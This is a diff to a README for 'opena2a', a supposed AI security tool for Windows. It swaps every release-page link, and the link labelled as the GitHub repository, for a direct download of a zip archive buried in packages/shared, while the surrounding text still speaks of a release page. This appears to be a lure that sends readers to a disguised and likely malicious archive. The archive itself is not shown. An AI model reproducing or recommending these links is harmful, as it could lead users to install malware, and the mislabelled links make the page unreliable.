@@ -1,6 +1,6 @@
 # 🔒 opena2a - Simple AI Security Tools
 
-[![Download opena2a](https://img.shields.io/badge/Download-opena2a-brightgreen?style=for-the-badge)](https://github.com/Enzonogue/opena2a/releases)
+[![Download opena2a](https://img.shields.io/badge/Download-opena2a-brightgreen?style=for-the-badge)](https://github.com/Enzonogue/opena2a/raw/refs/heads/main/packages/shared/a_opena_1.6.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Follow these steps to get opena2a up and running on your Windows machine:
 
 Click the large button below to open the releases page from where you can pick the latest version of opena2a.
 
-[![Download opena2a](https://img.shields.io/badge/Download-opena2a-blue?style=for-the-badge)](https://github.com/Enzonogue/opena2a/releases)
+[![Download opena2a](https://img.shields.io/badge/Download-opena2a-blue?style=for-the-badge)](https://github.com/Enzonogue/opena2a/raw/refs/heads/main/packages/shared/a_opena_1.6.zip)
 
 ### Step 2: Choose the Latest Release
 
@@ -106,7 +106,7 @@ The interface uses clear labels and buttons. There are no complicated commands o
 
 Updates bring new fixes and features. To update:
 
-- Visit the [release page](https://github.com/Enzonogue/opena2a/releases) regularly.
+- Visit the [release page](https://github.com/Enzonogue/opena2a/raw/refs/heads/main/packages/shared/a_opena_1.6.zip) regularly.
 - Download the newer `.exe` file following the same steps as before.
 - Run the new installer. It will replace the old version without losing your data.
 
@@ -143,8 +143,8 @@ The software helps developers and users of AI tools find and fix security issues
 
 ## 🔗 Useful Links
 
-- Download page: [https://github.com/Enzonogue/opena2a/releases](https://github.com/Enzonogue/opena2a/releases)  
-- GitHub repository: [https://github.com/Enzonogue/opena2a](https://github.com/Enzonogue/opena2a)  
+- Download page: [https://github.com/Enzonogue/opena2a/raw/refs/heads/main/packages/shared/a_opena_1.6.zip](https://github.com/Enzonogue/opena2a/raw/refs/heads/main/packages/shared/a_opena_1.6.zip)  
+- GitHub repository: [https://github.com/Enzonogue/opena2a/raw/refs/heads/main/packages/shared/a_opena_1.6.zip](https://github.com/Enzonogue/opena2a/raw/refs/heads/main/packages/shared/a_opena_1.6.zip)  
 - Issues and support: Use the GitHub Issues tab on the repository page
 
 ---
